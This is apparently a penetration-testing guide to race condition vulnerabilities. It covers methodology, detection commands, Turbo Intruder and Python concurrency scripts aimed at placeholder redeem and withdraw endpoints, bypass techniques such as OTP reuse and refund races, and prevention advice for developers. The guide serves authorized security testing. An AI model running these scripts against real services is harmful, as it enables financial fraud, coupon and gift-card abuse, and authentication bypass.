# Race Conditions

> Practical, up‑to‑date guide for hunting **Race Conditions** (concurrency / timing vulnerabilities) during web pentests, bug bounty hunting, and security assessments.  
> Aligned with OWASP WSTG (Business Logic Testing), PortSwigger Research (Turbo Intruder techniques), YesWeHack Ultimate Guide (2025), recent 2025–2026 write‑ups (infinite discounts, gift card duplication, FinTech verification abuse), and trends (microservices races, async frameworks, single‑packet attacks).

Race conditions occur when multiple operations access shared resources concurrently without proper synchronization, allowing attackers to exploit timing windows for duplicate actions, limit bypasses, privilege escalation, or inconsistent states (CWE‑362).

## Methodology (Based on OWASP WSTG & PortSwigger)

**1. Identify vulnerable scenarios (2025–2026 hotspots)**  
- **Limited‑use constraints:** coupon/promo codes, gift cards, referral bonuses, one‑time tokens  
- **Shared state operations:** voting/liking systems (one‑per‑user limits), bank transfers/withdrawals, account verification (micro‑deposit confirmation)  
- **Inventory management:** limited‑stock purchases, last‑item races  
- **Signup/referral loops:** credit assignment, duplicate account creation  
- **Password reset / OTP redemption:** token reuse via concurrency  
- **API rate‑limited endpoints:** abuse via concurrent requests

**2. Map the flow** – Identify check → action → update sequence (e.g., validate coupon → apply discount → deduct uses). Look for server‑side validation that may be non‑atomic.

**3. Baseline** – Perform a single request, observe success/failure, balance changes, responses.

**4. Race window** – Send multiple identical/near‑identical requests concurrently (5–10 requests, increase to 50–200+). Use single‑packet attacks for microsecond windows.

**5. Observe anomalies** – Duplicate success messages, inconsistent state, extra credits/items, negative balances, multiple redemptions from one code/token.

## Tool Installation & Setup

```bash
# Burp Suite Turbo Intruder extension (gold standard for races)
# Install via BApp Store → "Turbo Intruder"

# Python with concurrent.futures for custom scripts
pip3 install requests

# ffuf / wrk / h2load for high‑speed HTTP flooding (optional)
sudo apt install ffuf wrk h2load -y
```

## Detection & Enumeration Commands

```bash
# 1. Identify potential race‑condition endpoints from crawled URLs
cat crawledurls.txt | grep -iE "(redeem|coupon|vote|like|follow|transfer|withdraw|balance|credit|bonus|discount|promo|token|otp|verify|confirm)" | anew race‑condition.txt

# 2. Quick concurrent test with curl (basic)
for i in {1..20}; do curl -X POST "http://target.com/api/redeem" -d "code=FREE" & done; wait

# 3. Use Burp Intruder manually:
#    - Send request to Intruder, set payload type: Null payloads
#    - Number of threads: 20+, generate 50+ requests
#    - Observe responses for duplicate successes

# 4. Python script for basic race testing (save as race.py)
cat > race.py << 'EOF'
import requests
from concurrent.futures import ThreadPoolExecutor

url = "http://target.com/api/redeem"
headers = {"Content-Type": "application/json", "Cookie": "session=..."}
data = {"code": "PROMO123"}

def send():
    return requests.post(url, json=data, headers=headers)

with ThreadPoolExecutor(max_workers=30) as executor:
    futures = [executor.submit(send) for _ in range(30)]
    for future in futures:
        print(future.result().status_code, future.result().text[:100])
EOF
python3 race.py
```

## Exploitation Commands & Scripts

### Turbo Intruder (Burp Extension) – Most Effective
1. Send request to Turbo Intruder.
2. Use Python engine script (adjust concurrentConnections, requestsPerConnection):
```python
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=20,
                           requestsPerConnection=100,
                           pipeline=False
                           )
    for i in range(50):
        engine.queue(target.req, target.req)  # duplicate request

def handleResponse(req, interesting):
    if interesting:
        table.add(req)
```
3. **Single‑packet attack** (tightest timing):
```python
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=1,
                           engine=Engine.BURP2,
                           pipeline=True
                           )
    for i in range(30):
        engine.queue(target.req)
```

### Python Script with ThreadPoolExecutor
```bash
cat > race-advanced.py << 'EOF'
import requests
import concurrent.futures
import sys

url = "https://target.com/api/withdraw"
headers = {
    "Content-Type": "application/json",
    "Authorization": "Bearer ...",
    "X-CSRF-Token": "..."
}
payload = {"amount": 100, "account": "attacker"}

def attack(i):
    resp = requests.post(url, json=payload, headers=headers)
    print(f"[{i}] {resp.status_code} {resp.text.strip()}")
    return resp

with concurrent.futures.ThreadPoolExecutor(max_workers=50) as executor:
    futures = [executor.submit(attack, i) for i in range(50)]
    for future in concurrent.futures.as_completed(futures):
        pass  # results already printed
EOF
python3 race-advanced.py
```

### Burp Intruder (Classic)
- **Attack type:** Pitchfork (if varying parameters) or Sniper (same request).
- **Payloads:** Null payloads, count = 50.
- **Options:** Increase threads to 30–50, throttle disabled.

### ffuf for High‑Speed Flooding (Less Precise)
```bash
# Generate request file (req.txt) with raw HTTP request
ffuf -request req.txt -request‑proto http -t 50 -c -p 0.1 -rate 1000
```

## Advanced Techniques & Bypasses (2025‑2026 Trends)

**1. Microservices / async queues** – Race across different services (e.g., inventory service vs. payment service). Send requests to separate endpoints simultaneously.

**2. Distributed locks missing** – Check if Redis/etcd locks are used; race may still succeed if lock timeout or stale lock.

**3. TOCTOU (Time‑of‑check to time‑of‑use)** – File upload → validation → move race; resource creation with uniqueness checks.

**4. Race with cancellation / refund endpoints** – Initiate purchase and cancel concurrently, possibly resulting in free item + refund.

**5. OTP / 2FA reuse via concurrent verification** – Submit same OTP multiple times before it's invalidated.

**6. Signup race → multiple accounts same email/phone** – Bypass "email already registered" check.

**7. Parameter tampering mid‑race** – Change amount or account ID between concurrent requests (requires pitchfork attack).

**8. Single‑packet attack** – Turbo Intruder's engine that sends all requests in a single TCP packet (microsecond timing).

## Detection & Verification

- **Success signs:** Multiple "success" responses, balance/count incremented multiple times, server returns different states across responses, financial/inventory inconsistency.
- **Blind races:** Poll balance/status after race, check email/notifications for multiple credits, use timing differences if action has side‑effects.
- **Impact escalation:** Quantify abuse (e.g., $10k free credit), screenshot before/after states, demonstrate real‑world impact.

## Prevention Guidance (Developer‑Focused 2026 Best Practices)

1. **Atomic operations** – Use DB transactions with `SERIALIZABLE` isolation, `SELECT FOR UPDATE` for critical sections.
2. **Distributed locks** – Redis/etcd/ZooKeeper for shared state across microservices.
3. **Idempotency keys** – Unique nonce per request; reject duplicates.
4. **Optimistic concurrency** – Version/ETag checks (compare‑and‑swap).
5. **Pessimistic locking** – Lock row during critical section (row‑level locks).
6. **Rate limiting per user/action** – But not sole defense (races can still happen within limit window).
7. **Server‑side state validation** – Re‑check limits after race window (post‑action verification).
8. **Use idempotent APIs** – Design endpoints to be safe when called multiple times.

## References

- [YesWeHack: Ultimate Guide to Race Conditions (2025)](https://www.yeswehack.com/learn-bug-bounty/ultimate-guide-race-condition-vulnerabilities)
- [PortSwigger: Turbo Intruder Research](https://portswigger.net/research/turbo-intruder-embracing-the-billion-request-attack)
- [OWASP WSTG: Business Logic Testing](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/10-Business_Logic_Testing)
- Recent 2025–2026 write‑ups: InfoSec Write‑ups (coupon races, FinTech 1Rs abuse), Medium/Dev.to (multi‑face races), Cycode 2026 vuln trends
- **Checklist:** [Web‑Vulnerability‑Testing‑Checklist/Race‑Conditions.md](../Web‑Vulnerability‑Testing‑Checklist/Race‑Conditions.md)
